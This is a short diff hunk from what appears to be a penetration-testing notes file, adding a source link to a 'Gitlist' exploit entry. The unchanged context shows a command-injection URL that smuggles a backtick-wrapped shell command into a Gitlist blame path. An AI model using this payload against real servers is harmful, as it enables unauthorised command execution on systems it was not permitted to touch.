@@ -352,7 +352,7 @@ searchsploit postgreesql
 
 ### Exploits
 
-#### Gitlist
+#### Gitlist - [Source](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/)
 ```bash
 http://localhost/gitlist/my_repo.git/blame/master/""`whoami`
 ```
